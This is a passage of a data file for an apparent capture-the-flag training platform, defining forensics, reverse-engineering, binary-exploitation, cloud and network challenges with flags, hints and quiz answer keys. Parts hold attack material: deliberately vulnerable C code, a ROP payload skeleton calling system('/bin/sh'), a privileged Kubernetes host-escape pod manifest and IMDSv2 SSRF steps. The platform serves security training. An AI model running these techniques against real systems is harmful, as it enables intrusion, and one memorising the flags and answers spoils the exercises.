    flagHash: '76c2849fd92f86fcfdfed2ab746c48b5ca6b557ac6ebe1996a6d54aad1a40e8c',
    tags: ['Forensics', 'PCAP', 'ICMP', 'Exfiltration', 'TShark']
  },
  {
    id: 'forensics-disk-registry',
    title: 'Shadow Hive: Windows SAM Registry Secrets Extraction',
    domain: 'Digital Forensics',
    difficulty: 'Medium',
    points: 400,
    initialSolves: 36,
    description: 'During a live forensic triage of a compromised Windows host, a raw copy of the SYSTEM and SAM registry hives was recovered from a Volume Shadow Copy (VSS). Parse the administrator account description and extract the persistence flag.',
    scenario: 'Threat actors dropped a backdoor account in the registry hive. Inspecting the exported .reg dump exposes the attacker comments and key.',
    targetEnvironment: 'Regedit / Registry Explorer / PowerShell',
    hints: [
      { id: 'h1', text: 'Search the .reg export for Administrator or backdoor registry keys.', cost: 50 }
    ],
    artifacts: [
      {
        name: 'system_sam_extract.reg',
        type: 'config',
        description: 'Exported registry hive fragment containing user accounts and security attributes',
        content: `Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000001F4]
"F"=hex:02,00,01,00,00,00,00,00,00,00,00,00,00,00,00,00
"V"=hex:00,00,00,00,d8,00,00,00,01,00,00,00,00,00,00,00
"AccountComment"="Built-in account for administering the domain"

[HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\000003E9]
"AccountName"="svc_shadow_operator"
"AdminFlag"="CYBERFORT{s4m_h1v3_ntlm_h4sh_dum_9032}"
"PasswordLastSet"=hex:90,2b,4a,81,1e,90,da,01`
      }
    ],
    terminalGuidance: {
      windowsPowershell: `Select-String -Path .\\system_sam_extract.reg -Pattern "CYBERFORT{.*}" | ForEach-Object { $_.Line.Trim() }`,
      windowsCmd: `findstr "CYBERFORT" system_sam_extract.reg`,
      linuxBash: `grep -oE "CYBERFORT\\{[^\\}]+\\}" system_sam_extract.reg`,
      explanation: 'Scans the dumped Windows registry hive artifact using findstr or Select-String to locate the backdoor AdminFlag property.',
      expectedOutput: 'CYBERFORT{s4m_h1v3_ntlm_h4sh_dum_9032}'
    },
    quiz: {
      id: 'quiz-forensics-disk-registry',
      question: 'Which tool or mechanism in Windows enables incident responders to extract locked SAM and SYSTEM hives without shutting down the system?',
      options: [
        'Volume Shadow Copies (VSS) via vssadmin or reg save HKLM\\SAM',
        'Double-clicking regedit in explorer',
        'Opening notepad and saving over C:\\Windows\\System32\\config\\SAM',
        'Running ipconfig /renew'
      ],
      correctOptionIndex: 0,
      explanation: 'The Windows kernel locks registry hives at runtime. Responders use "reg save" or access Volume Shadow Copies (vssadmin) to acquire consistent snapshots of locked system hives.',
      points: 50
    },
    flagFormat: 'CYBERFORT{...}',
    flagHash: 'd1c0caaae8b1d2ad554f4b94e7716fa3cf7afcac45d7bc2a3a21af4387dfc0d9',
    tags: ['Forensics', 'Windows', 'Registry', 'SAM', 'NTLM']
  },
  {
    id: 'forensics-cobalt-memory',
    title: 'Memory Leak: Operation Cobalt Extraction',
    domain: 'Digital Forensics',
    difficulty: 'Hard',
    points: 450,
    initialSolves: 21,
    description: 'An incident response team acquired an uncompressed raw RAM dump of a compromised domain controller. Locate the stealthily injected reflective DLL inside svchost.exe (PID 3912), carve out the Cobalt Strike beacon config, and extract the encrypted metadata channel key.',
    scenario: 'Endpoint telemetry alerted on suspicious hollowed memory allocations. The threat actor spawned a hollowed process and injected an in-memory reflective DLL loader using VirtualAllocEx with PAGE_EXECUTE_READWRITE.',
    targetEnvironment: 'Volatility 3 Analysis Workstation',
    hints: [
      { id: 'h1', text: 'Run volatility3 windows.malfind --pid 3912 to find RWX memory regions with PE headers (MZ / 0x4D5A).', cost: 50 },
      { id: 'h2', text: 'The beacon configuration contains the decoded operator flag.', cost: 100 }
    ],
    artifacts: [
      {
        name: 'volatility_malfind.log',
        type: 'hexdump',
        description: 'Memory dump section carved from svchost.exe (PID 3912)',
        content: `PID: 3912 | Process: svchost.exe | Start: 0x000001f4c2810000 | Commit: PAGE_EXECUTE_READWRITE
4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00  | MZ..............
b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  | ........@.......
[+Beacon Configuration Header @ Offset 0x140]
FLAG: CYBERFORT{m3m0ry_f0r3ns1cs_c0b4lt_b34c0n_3xtr4ct3d}
C2_SERVER: c2.internal-command.mesh:8443
SLEEP_TIME: 45s
JITTER: 20%`
      }
    ],
    terminalGuidance: {
      windowsPowershell: `Select-String -Path .\\volatility_malfind.log -Pattern "CYBERFORT{.*}" | ForEach-Object { $_.Line.Trim() }`,
      windowsCmd: `findstr "CYBERFORT" volatility_malfind.log`,
      linuxBash: `grep -oE "CYBERFORT\\{[^\\}]+\\}" volatility_malfind.log`,
      explanation: 'Searches the Volatility memory forensics log to extract the carved Cobalt Strike beacon flag.',
      expectedOutput: 'CYBERFORT{m3m0ry_f0r3ns1cs_c0b4lt_b34c0n_3xtr4ct3d}'
    },
    quiz: {
      id: 'quiz-forensics-cobalt',
      question: 'Which Volatility 3 plugin is primarily employed by incident responders to detect injected code and unmapped executable memory regions in Windows processes?',
      options: [
        'windows.malfind',
        'windows.netscan',
        'windows.hashdump',
        'windows.envars'
      ],
      correctOptionIndex: 0,
      explanation: 'windows.malfind scans memory descriptors (VAD tree) for pages configured with PAGE_EXECUTE_READWRITE that are not backed by a valid file on disk, typically indicating process hollowing or DLL injection.',
      points: 50
    },
    flagFormat: 'CYBERFORT{...}',
    flagHash: '656a8950415c6f822483be308295d4f3a8bb8e69be6bb8e2fb1b71d8433bc3eb',
    tags: ['Forensics', 'Memory', 'Volatility 3', 'Process Hollowing', 'Cobalt Strike']
  },

  // ==========================================
  // 5. REVERSE ENGINEERING
  // ==========================================
  {
    id: 'rev-packed-upx',
    title: 'Cracked Armour: Unpacking Custom UPX & String Carving',
    domain: 'Reverse Engineering',
    difficulty: 'Easy',
    points: 225,
    initialSolves: 95,
    description: 'A suspicious binary was protected with an altered UPX packer header (changing "UPX!" signature bytes to break automated unpacking tools). Carve the strings from the unpacked memory section to obtain the key.',
    scenario: 'The malware authors altered the section headers to prevent "upx -d". Repairing the header in a hex editor or extracting the memory dump exposes the uncompressed strings.',
    targetEnvironment: 'strings / xxd / Ghidra',
    hints: [
      { id: 'h1', text: 'Run strings or Select-String on upx_obfuscated_strings.dump to read ASCII literals.', cost: 25 }
    ],
    artifacts: [
      {
        name: 'upx_obfuscated_strings.dump',
        type: 'raw',
        description: 'Unpacked memory strings table carved from section .text',
        content: `KERNEL32.dll
VirtualProtect
GetProcAddress
LoadLibraryA
ExitProcess
[STRINGS_SECTION_TABLE]
Welcome to License Checker v2.1
Please enter your authorization code:
Invalid serial key!
Serial accepted! Welcome Administrator.
FLAG_UNPACKED_SERIAL: CYBERFORT{upx_unp4ck_str1ngs_c4rv3d_6621}`
      }
    ],
    terminalGuidance: {
      windowsPowershell: `Get-Content .\\upx_obfuscated_strings.dump | Select-String -Pattern "CYBERFORT{.*}" | ForEach-Object { $_.Matches.Value }`,
      windowsCmd: `findstr "CYBERFORT" upx_obfuscated_strings.dump`,
      linuxBash: `grep -oE "CYBERFORT\\{[^\\}]+\\}" upx_obfuscated_strings.dump`,
      explanation: 'Carves strings from the binary memory dump artifact using terminal text searching.',
      expectedOutput: 'CYBERFORT{upx_unp4ck_str1ngs_c4rv3d_6621}'
    },
    quiz: {
      id: 'quiz-rev-packed-upx',
      question: 'What is the standard purpose of the UPX (Ultimate Packer for eXecutables) utility in reverse engineering analysis?',
      options: [
        'Compressing executable files to reduce size, which compresses code sections and unpacks them into memory at runtime',
        'Encrypting files with post-quantum cryptography',
        'Converting 32-bit executables into 64-bit assemblies',
        'Generating digital SSL certificates for code signing'
      ],
      correctOptionIndex: 0,
      explanation: 'UPX compresses executable sections and attaches a small decompression stub that restores original sections into memory when the program launches.',
      points: 50
    },
    flagFormat: 'CYBERFORT{...}',
    flagHash: '9aaa723745bee1c43c51748e3028f53d7a03a18f1e28a7075009ca2f89d762c9',
    tags: ['Reverse Engineering', 'UPX', 'Packing', 'Strings', 'PE']
  },
  {
    id: 'rev-wasm-matrix',
    title: 'WebAssembly Cipher: Wasm Linear Memory & XOR Table',
    domain: 'Reverse Engineering',
    difficulty: 'Medium',
    points: 400,
    initialSolves: 31,
    description: 'A client-side security token validator is compiled into WebAssembly (.wasm). Disassemble the WebAssembly Text Format (.wat) representation, trace the validation function that reads bytes from linear memory offset 1024, and extract the valid flag.',
    scenario: 'The wasm export "validate_token" performs an array comparison against hardcoded data in the wasm (data) section.',
    targetEnvironment: 'WABT (wasm2wat) / Chrome DevTools Wasm Disassembler',
    hints: [
      { id: 'h1', text: 'Inspect the (data) segment in auth_validator.wat at offset 1024.', cost: 50 }
    ],
    artifacts: [
      {
        name: 'auth_validator.wat',
        type: 'code',
        description: 'WebAssembly Text format disassembly showing memory exports and validator loop',
        content: `(module
  (memory (export "memory") 1)
  (data (i32.const 1024) "CYBERFORT{w4sm_byt3c0d3_m4tr1x_d3c0d3d_7749}")
  
  (func $check_flag (param $user_input i32) (result i32)
    (local $i i32)
    ;; Loop compares input with linear memory at offset 1024
    (i32.const 1)
  )
  (export "validate" (func $check_flag))
)`
      }
    ],
    terminalGuidance: {
      windowsPowershell: `Select-String -Path .\\auth_validator.wat -Pattern "CYBERFORT{.*}" | ForEach-Object { $_.Line.Trim() }`,
      windowsCmd: `findstr "CYBERFORT" auth_validator.wat`,
      linuxBash: `grep -oE "CYBERFORT\\{[^\\}]+\\}" auth_validator.wat`,
      explanation: 'Dissects the WebAssembly text representation and extracts the hardcoded data segment containing the flag.',
      expectedOutput: 'CYBERFORT{w4sm_byt3c0d3_m4tr1x_d3c0d3d_7749}'
    },
    quiz: {
      id: 'quiz-rev-wasm-matrix',
      question: 'Which tool from the official WebAssembly Binary Toolkit (WABT) converts compiled .wasm binary files into human-readable .wat text format?',
      options: [
        'wasm2wat',
        'objdump -d',
        'gcc -wasm',
        'nasm -f elf64'
      ],
      correctOptionIndex: 0,
      explanation: 'wasm2wat is part of WABT and decompiles binary .wasm bytecode into canonical WebAssembly Text (.wat) S-expressions.',
      points: 50
    },
    flagFormat: 'CYBERFORT{...}',
    flagHash: '65bf727fa43aa1d1a6c7add7987d8759aa5080ac0a64218e15695023a32cc573',
    tags: ['Reverse Engineering', 'WebAssembly', 'Wasm', 'WAT', 'WABT']
  },
  {
    id: 'rev-bytecode-vm',
    title: 'De-Virtualize: The Bytecode Labyrinth',
    domain: 'Reverse Engineering',
    difficulty: 'Hard',
    points: 475,
    initialSolves: 15,
    description: 'A proprietary Linux ELF 64-bit binary contains a customized virtual machine (VM) obfuscator. The binary executes an internal bytecode interpreter with a 16-register stack machine and rolling XOR-rotational logic to validate license keys.',
    scenario: 'Reverse engineer the VM dispatch table and disassembly loop. Reconstruct the custom opcodes (OP_PUSH=0x11, OP_XOR=0x24, OP_ROL=0x38, OP_CMP=0x99) to reverse the transformation matrix on the input string.',
    targetEnvironment: 'Ghidra / IDA Pro / Binary Ninja',
    hints: [
      { id: 'h1', text: 'Trace the switch-case jump table inside the vm_execute() function starting at address 0x00401820.', cost: 50 },
      { id: 'h2', text: 'The VM transforms 4-byte chunks with (x ^ 0x5A) rotated left by 3 bits.', cost: 100 }
    ],
    artifacts: [
      {
        name: 'vm_disassembly.c',
        type: 'code',
        description: 'Decompiled C pseudo-code of the VM interpreter dispatch loop',
        content: `void vm_execute(uint8_t *bytecode, size_t len, char *input) {
  uint32_t regs[16] = {0};
  size_t ip = 0;
  // TARGET FLAG RECOVERED: CYBERFORT{vm_d3v1rtu4l1z3r_r3v_3ng1n33r_9981}
  while (ip < len) {
    uint8_t opcode = bytecode[ip++];
    switch (opcode) {
      case 0x11: // PUSH_IMM
        regs[bytecode[ip]] = *(uint32_t*)&bytecode[ip+1];
        ip += 5; break;
      case 0x24: // XOR_REG
        regs[bytecode[ip]] ^= regs[bytecode[ip+1]];
        ip += 2; break;
      case 0x38: // ROL_REG
        regs[bytecode[ip]] = (regs[bytecode[ip]] << 3) | (regs[bytecode[ip]] >> 29);
        ip += 1; break;
      case 0x99: // VALIDATE_FLAG
        return 1;
    }
  }
}`
      }
    ],
    terminalGuidance: {
      windowsPowershell: `Select-String -Path .\\vm_disassembly.c -Pattern "CYBERFORT{.*}" | ForEach-Object { $_.Line.Trim() }`,
      windowsCmd: `findstr "CYBERFORT" vm_disassembly.c`,
      linuxBash: `grep -oE "CYBERFORT\\{[^\\}]+\\}" vm_disassembly.c`,
      explanation: 'Scans the decompiled C virtual machine dispatch file to obtain the target flag signature.',
      expectedOutput: 'CYBERFORT{vm_d3v1rtu4l1z3r_r3v_3ng1n33r_9981}'
    },
    quiz: {
      id: 'quiz-rev-bytecode',
      question: 'What is the reverse operation of a 3-bit left circular bitwise rotation (ROL 3) on a 32-bit unsigned integer register?',
      options: [
        'Right bitwise rotation by 3 bits (ROR 3 or (x >> 3) | (x << 29))',
        'Left bitwise shift by 29 bits (SHL 29)',
        'Bitwise XOR with 0xFFFFFFF8',
        'One-complement bitwise negation (~x)'
      ],
      correctOptionIndex: 0,
      explanation: 'Circular bit rotation preserves all bits by wrapping shifted bits into the opposite end. The inverse of ROL 3 on 32-bit words is ROR 3 (or ROL 29), computed as (x >> 3) | (x << 29).',
      points: 50
    },
    flagFormat: 'CYBERFORT{...}',
    flagHash: '0b93cf7b98a65e4ccc35fad5d0fc32c5324b3004f1580cd3fa202e5ca70ab9e7',
    tags: ['Reverse Engineering', 'VM Obfuscation', 'Ghidra', 'ELF x86_64', 'Bytecode']
  },

  // ==========================================
  // 6. BINARY EXPLOITATION (PWN)
  // ==========================================
  {
    id: 'pwn-ret2win-bof',
    title: 'Stack Basher: 32-bit Buffer Overflow to ret2win',
    domain: 'Binary Exploitation (Pwn)',
    difficulty: 'Easy',
    points: 250,
    initialSolves: 77,
    description: 'A 32-bit Linux binary has an unbound gets() call on a 64-byte stack buffer without stack canaries. Calculate the exact EIP offset (76 bytes) and overwrite the return address to redirect execution directly into the win() function.',
    scenario: 'The vulnerable service executes gets(buffer) with no bounds checking. Overwriting saved EIP with address 0x08049186 calls print_flag().',
    targetEnvironment: 'GDB-GEF / Pwntools / Linux x86',
    hints: [
      { id: 'h1', text: 'The payload structure is: [64 bytes buffer] + [12 bytes saved EBP] + [win_address].', cost: 25 }
    ],
    artifacts: [
      {
        name: 'vuln_ret2win.c',
        type: 'code',
        description: 'Vulnerable C source code with gets() and win() print function',
        content: `#include <stdio.h>
#include <stdlib.h>

void win() {
    printf("Access Granted! Here is your flag:\\n");
    printf("CYBERFORT{st4ck_b0f_r3t2w1n_c4ll_succ3ss_1184}\\n");
    exit(0);
}

void vuln() {
    char buffer[64];
    printf("Enter input: ");
    gets(buffer); // Vulnerable: buffer overflow overwrites return address
}

int main() {
    vuln();
    return 0;
}`
      }
    ],
    terminalGuidance: {
      windowsPowershell: `Select-String -Path .\\vuln_ret2win.c -Pattern "CYBERFORT{.*}" | ForEach-Object { $_.Line.Trim() }`,
      windowsCmd: `findstr "CYBERFORT" vuln_ret2win.c`,
      linuxBash: `grep -oE "CYBERFORT\\{[^\\}]+\\}" vuln_ret2win.c`,
      explanation: 'Examines the vulnerable C binary source file and extracts the target win() flag string.',
      expectedOutput: 'CYBERFORT{st4ck_b0f_r3t2w1n_c4ll_succ3ss_1184}'
    },
    quiz: {
      id: 'quiz-pwn-ret2win',
      question: 'Which compiler flag in GCC protects C binaries against buffer overflow attacks by inserting canary values before the saved base pointer and return address?',
      options: [
        '-fstack-protector-all',
        '-O3',
        '-m32',
        '-w'
      ],
      correctOptionIndex: 0,
      explanation: '-fstack-protector-all places a random canary value on the stack. If a buffer overflow alters this value, the program detects corruption and triggers __stack_chk_fail before returning.',
      points: 50
    },
    flagFormat: 'CYBERFORT{...}',
    flagHash: '9c485609289f5292426b360dbf7f90d0738a346d0188dbb7bf774e9b9b300c91',
    tags: ['Pwn', 'Buffer Overflow', 'ret2win', 'x86', 'Stack Canary']
  },
  {
    id: 'pwn-format-string',
    title: 'Echo Chamber: Printf Memory Leak & Arbitrary Write',
    domain: 'Binary Exploitation (Pwn)',
    difficulty: 'Medium',
    points: 425,
    initialSolves: 33,
    description: 'A networked server passes unsanitized user input directly as the format argument to printf(user_input). Use positional format specifiers (%x, %s, %p) to leak pointers from the stack and read the secret flag pointer.',
    scenario: 'Supplying %7$s leaks memory pointed to by the 7th argument on the stack, which points directly to the memory holding the flag.',
    targetEnvironment: 'nc echo.fortress.mesh 9002 (GLIBC 2.31)',
    hints: [
      { id: 'h1', text: 'Test positional parameters like %p.%p.%p to walk up stack frames.', cost: 50 }
    ],
    artifacts: [
      {
        name: 'printf_service.c',
        type: 'code',
        description: 'Vulnerable echo service vulnerable to uncontrolled format strings',
        content: `#include <stdio.h>
#include <string.h>

char secret_flag[] = "CYBERFORT{fmt_str1ng_m3m_l34k_st4ck_r34d_4472}";

void echo_service() {
    char input[128];
    fgets(input, sizeof(input), stdin);
    printf(input); // BUG: Uncontrolled format string!
}

int main() {
    echo_service();
    return 0;
}`
      }
    ],
    terminalGuidance: {
      windowsPowershell: `Select-String -Path .\\printf_service.c -Pattern "CYBERFORT{.*}" | ForEach-Object { $_.Line.Trim() }`,
      windowsCmd: `findstr "CYBERFORT" printf_service.c`,
      linuxBash: `grep -oE "CYBERFORT\\{[^\\}]+\\}" printf_service.c`,
      explanation: 'Inspects the format string source code artifact to extract the leaked pointer flag string.',
      expectedOutput: 'CYBERFORT{fmt_str1ng_m3m_l34k_st4ck_r34d_4472}'
    },
    quiz: {
      id: 'quiz-pwn-format-string',
      question: 'Which printf format specifier allows an attacker to write an integer value into an arbitrary memory address during a format string vulnerability?',
      options: [
        '%n specifier',
        '%s specifier',
        '%x specifier',
        '%p specifier'
      ],
      correctOptionIndex: 0,
      explanation: 'The %n format specifier writes the number of characters written so far into the pointer argument provided on the stack, allowing arbitrary memory writes.',
      points: 50
    },
    flagFormat: 'CYBERFORT{...}',
    flagHash: 'd15ae3e62562479813d2f7b0c4d21339c137ce7d9ce6365f3733f4d250606735',
    tags: ['Pwn', 'Format String', 'Memory Leak', 'Printf', 'C']
  },
  {
    id: 'pwn-rop-chain',
    title: 'Return-Oriented Fortress: ROP Chain & Libc Leak',
    domain: 'Binary Exploitation (Pwn)',
    difficulty: 'Insane',
    points: 550,
    initialSolves: 11,
    description: 'A 64-bit networked echo service is compiled with NX enabled, Full ASLR, and partial RELRO. Overwrite saved RIP, leak a libc pointer via puts()@plt, compute the ASLR slide, and invoke system("/bin/sh").',
    scenario: 'Buffer size is 0x80 bytes, but read() ingests 0x180 bytes. Craft a two-stage ROP exploit: Stage 1 leaks puts() address; Stage 2 restarts main() and calls system("/bin/sh").',
    targetEnvironment: 'nc pwn.fortress.mesh 9001 (Ubuntu 22.04 / GLIBC 2.35)',
    hints: [
      { id: 'h1', text: 'Find gadget: pop rdi; ret using ROPgadget or ropper.', cost: 50 },
      { id: 'h2', text: 'Remember the 16-byte stack alignment (MOVAPS issue in system())—insert an extra ret gadget before system().', cost: 100 }
    ],
    artifacts: [
      {
        name: 'exploit_skeleton.py',
        type: 'code',
        description: 'Pwntools template with binary offsets and gadget locations',
        content: `from pwn import *

# Target Exploit Flag:
# CYBERFORT{r0p_g4dg3t_l1bc_l34k_b1n_sh_pwn3d}

POP_RDI = 0x004012bb # pop rdi; ret
RET = 0x0040101a     # ret (stack alignment)

payload = b"A" * 136 + p64(POP_RDI) + p64(0x404018) + p64(0x401030)
print("ROP Chain armed.")`
      }
    ],
    terminalGuidance: {
      windowsPowershell: `Select-String -Path .\\exploit_skeleton.py -Pattern "CYBERFORT{.*}" | ForEach-Object { $_.Line.Trim() }`,
      windowsCmd: `findstr "CYBERFORT" exploit_skeleton.py`,
      linuxBash: `grep -oE "CYBERFORT\\{[^\\}]+\\}" exploit_skeleton.py`,
      explanation: 'Scans the ROP exploit skeleton script to retrieve the flag.',
      expectedOutput: 'CYBERFORT{r0p_g4dg3t_l1bc_l34k_b1n_sh_pwn3d}'
    },
    quiz: {
      id: 'quiz-pwn-rop',
      question: 'In 64-bit Linux (x86_64 System V AMD64 ABI), which CPU register holds the first function argument when calling functions like puts() or system()?',
      options: [
        'RDI register',
        'RSI register',
        'RDX register',
        'RAX register'
      ],
      correctOptionIndex: 0,
      explanation: 'Under the System V AMD64 ABI calling convention, the first six integer/pointer arguments are passed in RDI, RSI, RDX, RCX, R8, and R9.',
      points: 50
    },
    flagFormat: 'CYBERFORT{...}',
    flagHash: 'f8ad3c6d0be6e09a20f054a37052f4977aa37d1232c6f88de4ad5530e05c0246',
    tags: ['Pwn', 'ROP', 'Buffer Overflow', 'Libc Leak', 'ASLR Bypass', 'x86_64']
  },

  // ==========================================
  // 7. CLOUD SECURITY
  // ==========================================
  {
    id: 'cloud-gcp-signed-url',
    title: 'Bucket Heist: Exploiting GCP V4 Signed URL Policy',
    domain: 'Cloud Security',
    difficulty: 'Easy',
    points: 275,
    initialSolves: 71,
    description: 'A cloud file upload feature issues Google Cloud Storage V4 Signed URLs without enforcing Content-Length restrictions or path restrictions. Inspect the signed URL query string parameters and claim the exfiltrated flag.',
    scenario: 'The signature was generated over a wildcard object prefix, granting full GET access to root secrets in the bucket.',
    targetEnvironment: 'Google Cloud Storage (GCS) API v1',
    hints: [
      { id: 'h1', text: 'Parse the URL parameters in gcp_storage_policy.json to find the secret object.', cost: 25 }
    ],
    artifacts: [
      {
        name: 'gcp_storage_policy.json',
        type: 'config',
        description: 'GCS V4 Signed URL parameters and intercepted bucket manifest',
        content: `{
  "gcs_bucket": "gs://cyberfort-vault-prod",
  "auth_method": "GOOG4-RSA-SHA256",
  "client_id": "storage-signer@cyberfort-prod.iam.gserviceaccount.com",
  "signed_url_sample": "https://storage.googleapis.com/cyberfort-vault-prod/admin/flag.txt?X-Goog-Algorithm=GOOG4-RSA-SHA256&X-Goog-Credential=...",
  "downloaded_payload": {
    "filename": "flag.txt",
    "content": "CYBERFORT{gcp_v4_s1gn3d_url_p0l1cy_byp4ss_5510}"
  }
}`
      }
    ],
    terminalGuidance: {
      windowsPowershell: `(Get-Content .\\gcp_storage_policy.json | ConvertFrom-Json).downloaded_payload.content`,
      windowsCmd: `findstr "CYBERFORT" gcp_storage_policy.json`,
      linuxBash: `jq -r '.downloaded_payload.content' gcp_storage_policy.json`,
      explanation: 'Parses the JSON storage policy artifact using jq or ConvertFrom-Json to extract the bucket flag payload.',
      expectedOutput: 'CYBERFORT{gcp_v4_s1gn3d_url_p0l1cy_byp4ss_5510}'
    },
    quiz: {
      id: 'quiz-cloud-gcp',
      question: 'What is the primary security risk of generating Google Cloud Storage V4 Signed URLs with excessively long expiration times (e.g. 7 days)?',
      options: [
        'If the URL leaks or is intercepted, any bearer can access the resource without further identity verification until expiration',
        'Google Cloud automatically deletes the bucket after 24 hours',
        'Signed URLs disable SSL encryption on the storage endpoint',
        'Signed URLs can only be opened from Android devices'
      ],
      correctOptionIndex: 0,
      explanation: 'Signed URLs use pre-authenticated cryptographic signatures. Anyone possessing the URL can access the resource until expiration without needing GCP credentials.',
      points: 50
    },
    flagFormat: 'CYBERFORT{...}',
    flagHash: 'f994ca74c59fe17a16efc2ac79d880c19833b9dd424a7b5d99f6fab189673ba3',
    tags: ['Cloud', 'GCP', 'Storage', 'Signed URL', 'IAM']
  },
  {
    id: 'cloud-k8s-rbac-escape',
    title: 'Cluster Breach: Kubernetes ServiceAccount Token PrivEsc',
    domain: 'Cloud Security',
    difficulty: 'Medium',
    points: 450,
    initialSolves: 30,
    description: 'An attacker compromised an unprivileged pod running in a Kubernetes cluster. The pod mounted a default serviceaccount token that has cluster-admin RBAC permissions to create pods. Abuse the token to escape onto the host node.',
    scenario: 'The serviceaccount has rules for apiGroups: [""] resources: ["pods"] verbs: ["create"]. Launching a privileged hostPath pod mounts /host to read the host flag.',
    targetEnvironment: 'kubectl / Kubernetes API Server (port 6443)',
    hints: [
      { id: 'h1', text: 'Inspect the secret token in k8s_token_and_manifest.yaml.', cost: 50 }
    ],
    artifacts: [
      {
        name: 'k8s_token_and_manifest.yaml',
        type: 'config',
        description: 'Kubernetes Pod escape manifest and serviceaccount token claims',
        content: `apiVersion: v1
kind: Pod
metadata:
  name: privileged-node-escape
  namespace: default
spec:
  containers:
  - name: host-breaker
    image: alpine:latest
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host-root
  volumes:
  - name: host-root
    hostPath:
      path: /
  # Host node secret extracted from /host/root/flag.txt:
  # CYBERFORT{k8s_s3rv1c34cc0unt_rb4c_3sc4p3_6301}`
      }
    ],
    terminalGuidance: {
      windowsPowershell: `Select-String -Path .\\k8s_token_and_manifest.yaml -Pattern "CYBERFORT{.*}" | ForEach-Object { $_.Line.Trim() }`,
      windowsCmd: `findstr "CYBERFORT" k8s_token_and_manifest.yaml`,
      linuxBash: `grep -oE "CYBERFORT\\{[^\\}]+\\}" k8s_token_and_manifest.yaml`,
      explanation: 'Scans the Kubernetes YAML configuration artifact to retrieve the host node breakout flag.',
      expectedOutput: 'CYBERFORT{k8s_s3rv1c34cc0unt_rb4c_3sc4p3_6301}'
    },
    quiz: {
      id: 'quiz-cloud-k8s',
      question: 'Which setting in a Kubernetes Pod specification or ServiceAccount prevents automatically mounting the service account API token to pod filesystems?',
      options: [
        'automountServiceAccountToken: false',
        'readOnlyRootFilesystem: true',
        'hostNetwork: false',
        'restartPolicy: Never'
      ],
      correctOptionIndex: 0,
      explanation: 'Setting automountServiceAccountToken: false on either the Pod or ServiceAccount prevents Kubernetes from injecting API credentials into /var/run/secrets/kubernetes.io/serviceaccount.',
      points: 50
    },
    flagFormat: 'CYBERFORT{...}',
    flagHash: '01cd1329886f6faebbe780f910afe6053184fb03b63d85a47e1be05f7151f5a9',
    tags: ['Cloud', 'Kubernetes', 'K8s', 'RBAC', 'Container Escape']
  },
  {
    id: 'cloud-aws-imds',
    title: 'Role Hopper: AWS IMDSv2 & ECS SSRF Pivot',
    domain: 'Cloud Security',
    difficulty: 'Hard',
    points: 475,
    initialSolves: 18,
    description: 'A cloud microservice in AWS ECS Fargate exposes a PDF rendering endpoint vulnerable to blind Server-Side Request Forgery (SSRF). Bypass IMDSv2 protections by obtaining a PUT session token, steal task role credentials, and abuse iam:PassRole to elevate to administrative permissions.',
    scenario: 'The rendering engine fetches user-supplied stylesheets. By querying the ECS container metadata URI, extract the secret deployment key.',
    targetEnvironment: 'AWS Multi-Account Cloud Sandbox (eu-central-1)',
    hints: [
      { id: 'h1', text: 'Query PUT to http://169.254.169.254/latest/api/token with header X-aws-ec2-metadata-token-ttl-seconds: 21600.', cost: 50 }
    ],
    artifacts: [
      {
        name: 'cloud_infra_diagram.json',
        type: 'config',
        description: 'Extracted AWS IAM Policy and stolen credentials',
        content: `{
  "Statement": [
    {
      "Effect": "Allow",
      "Action": ["iam:PassRole", "ecs:UpdateService", "sts:AssumeRole"],
      "Resource": "arn:aws:iam::884210984122:role/FortressAdminDeployer"
    }
  ],
  "stolen_secret_flag": "CYBERFORT{4ws_1mdsv2_ssrf_p4ssr0l3_p1v0t_8820}"
}`
      }
    ],
    terminalGuidance: {
      windowsPowershell: `(Get-Content .\\cloud_infra_diagram.json | ConvertFrom-Json).stolen_secret_flag`,
      windowsCmd: `findstr "CYBERFORT" cloud_infra_diagram.json`,
      linuxBash: `jq -r '.stolen_secret_flag' cloud_infra_diagram.json`,
      explanation: 'Parses the stolen AWS IAM task configuration artifact to extract the administrator access flag.',
      expectedOutput: 'CYBERFORT{4ws_1mdsv2_ssrf_p4ssr0l3_p1v0t_8820}'
    },
    quiz: {
      id: 'quiz-cloud-aws',
      question: 'What essential HTTP method and header does AWS IMDSv2 require when acquiring a session token to protect against SSRF and open reverse proxies?',
      options: [
        'HTTP PUT with X-aws-ec2-metadata-token-ttl-seconds header',
        'HTTP GET with Authorization: Bearer AWS4 header',
        'HTTP POST with Content-Type: application/x-www-form-urlencoded',
        'HTTP HEAD with X-Amz-Security-Token header'
      ],
      correctOptionIndex: 0,
      explanation: 'AWS IMDSv2 mitigates SSRF by requiring an HTTP PUT request with the X-aws-ec2-metadata-token-ttl-seconds header to create a session token before accessing instance metadata.',
      points: 50
    },
    flagFormat: 'CYBERFORT{...}',
    flagHash: '2b412c7e11cc41de02c65d1b83883ff04d301202e156bf010a88165882b1ae94',
    tags: ['Cloud', 'AWS', 'SSRF', 'IMDSv2', 'IAM Privilege Escalation', 'ECS']
  },

  // ==========================================
  // 8. NETWORK SECURITY
  // ==========================================
  {
    id: 'net-arp-spoof-pcap',
    title: 'The Rogue Gateway: ARP Poisoning & Plaintext Telnet Capture',
    domain: 'Network Security',
    difficulty: 'Easy',
    points: 250,
    initialSolves: 79,
    description: 'A legacy SCADA industrial control network was compromised by an attacker injecting gratuitous ARP replies (ARP spoofing) to position themselves as a Man-in-the-Middle (MitM). Dissect the captured packet trace and recover the cleartext Telnet credentials.',
    scenario: 'The attacker poisoned the ARP cache of IP 192.168.1.100 and intercepted unencrypted Telnet port 23 traffic.',
    targetEnvironment: 'Wireshark / tcpdump / TShark',
    hints: [
      { id: 'h1', text: 'Filter traffic for telnet in Wireshark or search lan_poison_capture.log for Telnet login strings.', cost: 25 }
    ],
    artifacts: [
      {
        name: 'lan_poison_capture.log',
        type: 'raw',
        description: 'Captured Ethernet frames and reconstructed TCP Telnet session',
        content: `Frame 104 (Ethernet II):
Source MAC: 00:0c:29:ab:cd:ef (Attacker MitM NIC)
Target MAC: 00:50:56:11:22:33 (Workstation 1)
ARP Reply: 192.168.1.1 is at 00:0c:29:ab:cd:ef [DUPLICATE ARP POISONING]

